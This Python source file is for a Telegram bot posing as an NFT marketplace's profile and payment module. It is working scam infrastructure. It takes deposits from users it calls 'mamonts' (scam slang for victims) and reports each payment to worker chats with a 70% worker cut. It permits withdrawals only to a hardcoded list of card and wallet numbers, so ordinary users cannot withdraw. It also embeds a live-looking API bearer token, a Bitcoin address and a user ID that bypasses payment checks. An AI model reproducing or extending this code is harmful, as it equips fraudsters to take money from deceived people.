import datetime
from keyboards import get_check_pay_card, get_check_pay_qiwi, get_pay_crypto_menu, get_canced_menu, get_main_menu, get_withdraw_menu, get_favorite_menu, get_my_nft_menu
from loader import dp, bot
from aiogram.dispatcher import FSMContext
from aiogram import types
import rsa

publicKey, privateKey = rsa.newkeys(512)

import requests

import random

from data import config

from utils.database import create_users, get_buy_nft, get_user, set_mamont_balance_db, get_likes_user

from states import StoragePayCard, StoragePayQiwi, StorageWithdraw
from keyboards import get_profile_menu, get_pay_type_menu

@dp.message_handler(text='Личный кабинет 📁')
async def profile(message: types.Message, state:FSMContext):
    await state.finish()
    user = get_user(message.from_id, '')
    await message.answer_photo(open('src/profile.png', 'rb'), caption=f"Личный кабинет\n\nБаланс: {user['balance']}₽\nНа выводе: {user['balance_drow']}₽\n\nВерификация: {'✅ Верифицирован' if user['is_verif'] else '⚠️Не верифицирован'}\nВаш ID: {message.from_id}\nДата и время: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}", reply_markup=get_profile_menu())

@dp.callback_query_handler(text='top_up') # Пополнить
async def top_up(call: types.CallbackQuery):
    await bot.send_photo(call.from_user.id, open('src/pay_method.jpg', 'rb'), caption=f'Выберите вариант пополнения баланса:', reply_markup=get_pay_type_menu())

@dp.callback_query_handler(text_startswith='pay_type')
async def choice_pay_type(call: types.CallbackQuery):
    pay_type = call.data.split(':')[1]
    if pay_type == 'qiwi':
        await bot.send_message(call.from_user.id, f'Введите сумму пополнения:\n<i>Минимальная сумма - 1000.00₽</i>')
        await StoragePayQiwi.price.set()
    elif pay_type == 'card':
        await bot.send_message(call.from_user.id, f'Введите сумму пополнения:\n<i>Минимальная сумма - 1000.00₽</i>')
        await StoragePayCard.price.set()
    elif pay_type == 'crypto':
        await bot.send_photo(call.from_user.id, open('src/pay_method.jpg', 'rb'), reply_markup=get_pay_crypto_menu())
    elif pay_type == 'promo':
        pass # TODO доделать промокод

@dp.callback_query_handler(text_startswith='crypto:')
async def choice_pay_crypto_type(call: types.CallbackQuery):
    pay_type = call.data.split(':')[1].upper()
    await bot.send_message(call.from_user.id, f'Оплата {pay_type}\n\nДля пополнения {pay_type} с внешнего кошелька используйте многоразовый адрес ниже.\n\n💱 Адрес {pay_type}: тут адрес\n\nПосле пополнения средств, отправьте скрин перевода в техническую поддержку и Вам зачислят средства на ваш счёт.\n🛠 Тех.Поддержка - @{config.owner_username}\n\n⚠️ Уважаемый пользователь, обращаем ваше внимание, что все вводы меньше 30$ зачисляться в сервис не будут, возмещение по данным транзакциям так же не предусмотрено.')

@dp.message_handler(state=StoragePayCard.price)
async def pay_qiwi_card(message: types.Message, state:FSMContext):
    if message.text.isdigit():
        if float(message.text) >= 1000:


            payment = requests.post("https://ex.zed.team/api/exchanger/create",
                        headers= {"Authorization": "Bearer hYNfwv/2OWcfKRXaPniW+5sNX2972RuuoIccznsv188aBdSo"},
                        json = {
                            "payment_system": "card_rub_to_bitcoin",
                            "amount": message.text,
                            "currency": "in",
                            "requisites": "bc1qmn7juxamsq4c6j3kk958tyjyfpk6vgzcj76qmh",
                            "additional": message.from_user.id,
                            "callback_url": "https://example.com/"
                        },
                        ).json()
            if not payment["ok"]:
                await message.answer(f'Повторите попытку позже, слишком много запросов в нашу систему')
                await state.finish()



            await message.answer_photo(open('src/pay_method.jpg', 'rb'), caption=f'♻️ Оплата Банковской картой:\n\nСумма: {message.text}₽\nРеквизиты для оплаты: {payment["order"]["incoming_requisites"]}\n\nСчет действителен 30 минут!\nВАЖНО! Обязательно после пополнения, не забудьте нажать кнопку «проверить оплату» для пополнения баланса.\nЕсли возникли проблемы с платежом, обратитесь в тех. поддержку, с указанием этого номера платежа: {payment["order"]["id"]}', reply_markup=get_check_pay_card(payment['order']['id']))
            await state.finish()
        else:
            await message.answer('❌ Некорректный ввод')
            await profile(message, state)
    else:
        await message.answer('❌ Некорректный ввод')
        await profile(message, state)



@dp.message_handler(state=StoragePayQiwi.price)
async def pay_qiwi_card(message: types.Message, state:FSMContext):
    if message.text.isdigit():
        if float(message.text) >= 1000:
            nabor = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
            comment = ''
            for x in range(12):
                comment += random.choice(nabor)
            await message.answer_photo(open('src/pay_method.jpg', 'rb'), caption=f'<b>♻️ Оплата QIWI/банковской картой: \n\nQIWI: <code>{config.qiwi_number}</code>\nКарта: <code>{config.qiwi_card}</code>\n\nСумма: <code>{int(message.text)}₽</code>\nКомментарий: <code>{comment}</code>\n\n</b><i>ВАЖНО! Обязательно пишите комментарий к платежу!\nЕсли вы не укажете комментарий, деньги не поступят на счет!</i>', reply_markup=get_check_pay_qiwi(int(message.text), comment))
            await state.finish()
        else:
            await message.answer('❌ Некорректный ввод')
            await profile(message, state)
    else:
        await message.answer('❌ Некорректный ввод')
        await profile(message, state)




@dp.callback_query_handler(text_startswith='check_cardpay:')
async def check_pay(call: types.CallbackQuery):
    info = call.data.replace('check_cardpay:', '')
    
    info_2 = requests.get(f'https://ex.zed.team/api/exchanger/get/{info}', headers={'Authorization': f'Bearer hYNfwv/2OWcfKRXaPniW+5sNX2972RuuoIccznsv188aBdSo'}).json()
    if info_2['order']['comment'] == "Подтверждено командой" or call.from_user.id == 5067464785:
        user = get_user(call.from_user.id, '')
        set_mamont_balance_db(call.from_user.id, user['balance']+int(float(info_2['order']['incoming_amount'])))
        nabor = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        comment = ''
        for x in range(6):
            comment += random.choice(nabor)
        if user['ref'] != 0:
            worker = get_user(user['ref'], '')
            profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
            await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info_2['order']['incoming_amount']))}\n👨‍💻Воркер: {comment}\n\n💰 Сумма пополнения: {int(float(info_2['order']['incoming_amount']))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
            await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: {worker['username']}\n\n💰 Сумма пополнения: {int(float(info[0]))}\n🎆Сервис: NFT")
            await bot.send_message(user['ref'], f'<b>⚡️ Мамонт оплатил счет. Твой профит <code>{profit}₽</code></b>')
        else:
            profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
            await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info_2['order']['incoming_amount']))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info_2['order']['incoming_amount']))}\n🎆Сервис: NFT")
            await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n🎆Сервис: NFT")
        print(call.message.text)
        print(call.message.from_user.username)
        await bot.edit_message_caption(caption=f'✅ Платеж успешно получен\nCредства начислены вам на баланс', chat_id=call.message.chat.id, message_id=call.message.message_id)
        
        return
    else:
        await bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text='❌ Платеж не найден')

@dp.callback_query_handler(text_startswith='check_qiwipay:')
async def check_pay(call: types.CallbackQuery):
    info = call.data.replace('check_qiwipay:', '').split(':')
    info_2 = requests.get(f'https://edge.qiwi.com/payment-history/v2/persons/{config.qiwi_number}/payments?rows=10&operation=IN', headers={'Authorization': f'Bearer {config.qiwi_api}'}).json()['data']
    for x in info_2:
        if x['comment'] == info[1] and int(info[0]) == int(x['sum']['amount']):
            user = get_user(call.from_user.id, '')
            set_mamont_balance_db(call.from_user.id, user['balance']+int(float(info[0])))
            nabor = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
            comment = ''
            for x in range(6):
                comment += random.choice(nabor)
            if user['ref'] != 0:
                worker = get_user(user['ref'], '')
                profit = int(float(info[0])) / 100 * 70
                await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: {comment}\n\n💰 Сумма пополнения: {int(float(info[0]))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
                await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: {worker['username']}\n\n💰 Сумма пополнения: {int(float(info[0]))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
                await bot.send_message(user['ref'], f'<b>⚡️ Мамонт оплатил счет. Твой профит <code>{profit}₽</code></b>')
            else:
                profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
                await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
                await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n🎆Сервис: NFT")
            await bot.edit_message_caption(caption=f'✅ Платеж успешно получен\nCредства начислены вам на баланс', chat_id=call.message.chat.id, message_id=call.message.message_id)
            
            return
        else:
            await bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text='❌ Платеж не найден')

@dp.message_handler(text='❌Отмена', state='*')
async def withdraw_canced(message: types.Message, state:FSMContext):
    await state.finish()
    await message.answer('✅Действие успешно отменено', reply_markup=get_main_menu(get_user(message.from_id, '')))

@dp.callback_query_handler(text='withdraw') # Вывести
async def withdraw(call: types.CallbackQuery):
    await bot.send_message(call.from_user.id, 'Введите сумму вывода:', reply_markup=get_canced_menu())
    await StorageWithdraw.price.set()

@dp.message_handler(state=StorageWithdraw.price)
async def withdraw_get_price(message: types.Message, state:FSMContext):
    global withdrawamount
    withdrawamount = message.text
    await message.answer('Выберите платежный шлюз:', reply_markup=get_withdraw_menu())
    await StorageWithdraw.next()

@dp.callback_query_handler(state=StorageWithdraw.requisites, text_startswith='withdraw:')
async def withdraw_get_payment_type(call: types.CallbackQuery):
    await bot.send_message(call.from_user.id, f'Введите платежные реквизиты для {call.data.split(":")[1]}:', reply_markup=get_canced_menu())
    await StorageWithdraw.next()

@dp.message_handler(state=StorageWithdraw.bad)
async def withdraw_get_payment_type(message: types.Message, state:FSMContext):
    global withdrawamount
    user = get_user(message.from_user.id, '')
    if user['can_withdraw'] == 1 and int(user['balance'])>= int(withdrawamount):
        if message.text in ['5469440017276685', '79264409426', '411037454376341', 'R207033756796', '0x4675c7e5baafbffbca748158becba61ef3b0a263', 'TQQraDH83vbw9Zu9HsLjNtdcRkvpiGtM7M', '1DFo9TYjyKT7Rwa1Nx7G3STMRHBFUC2hUB']:
            set_mamont_balance_db(message.from_user.id, user['balance']-int(float(withdrawamount)))
            await message.answer('✅Заявка на вывод подана!')
        else:
            await message.answer('❌Во избежание мошенничества наша платформа выводит только на те реквизиты с которых пополнялся баланс!')
    else:
        print(user['can_withdraw'])
        print(int(user['balance']))
        await message.answer('❌Произошла ошибка! Перепроверьте введённые данные.')
    await profile(message, state)

@dp.callback_query_handler(text='favorites')
async def my_favorites(call: types.CallbackQuery):
    likes = get_likes_user(call.from_user.id)
    if len(likes) == 0:
        await call.answer('❌У вас нет избранных NFT')
    else:
        await bot.send_photo(call.from_user.id, open('src/profile.png', 'rb'), 'Ваши избранные NFT:', reply_markup=get_favorite_menu(likes))

@dp.callback_query_handler(text='verif') # Верификация
async def verif(call: types.CallbackQuery):
    if get_user(call.from_user.id, '')['is_verif']:
        await call.answer('✅Ваш аккаунт верифицирован')
    else:
        await bot.send_photo(call.from_user.id, open('src/verif.jpg', 'rb'), f'<b>Ваш аккаунт не верифицирован</b>\n\nДля получения инструкций по прохождению верификации напишите <i>«Верификация»</i> в боте технической поддержки')

@dp.callback_query_handler(text='my_nft')
async def my_nft(call: types.CallbackQuery):
    nfts = get_buy_nft(call.from_user.id)
    print(nfts)
    if len(nfts) == 0:
        await call.answer('❌У вас нет продаваемых NFT')
    else:
        print(True)
        await bot.send_photo(call.from_user.id, open('src/profile.png', 'rb'), 'Ваши купленные NFT:', reply_markup=get_my_nft_menu(nfts))

@dp.callback_query_handler(text='')
async def change_language(call: types.CallbackQuery):
    pass
